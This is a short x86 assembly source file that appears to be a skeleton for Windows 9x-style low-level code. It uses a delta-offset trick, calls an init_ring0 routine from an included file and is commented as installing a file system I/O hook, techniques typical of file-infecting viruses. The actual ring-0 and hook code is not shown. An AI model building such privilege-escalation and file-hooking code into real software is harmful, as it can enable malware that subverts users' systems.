
        ; install file system io hook

include                 msg.inc

main:                  ;int 3

                        push    ebp
                        sub     esp, sdata_size
                        mov     ebp, esp

                        call    $+5
                        pop     eax
                        sub     eax, offset $-1
                        mov     base onstack, eax

                        mov     ebx, base onstack
                        mov     al, byte ptr page1[ebx]
                        mov     al, byte ptr page2[ebx]
                        if      pages ne 2
                        .err    'see above'
                        endif

                        call    init_ring0

                        int     ii

cycle:                  nop
                        nop

                        jmp     cycle

                        add     esp, sdata_size
                        pop     ebp
                        ret

include                 ring0.inc
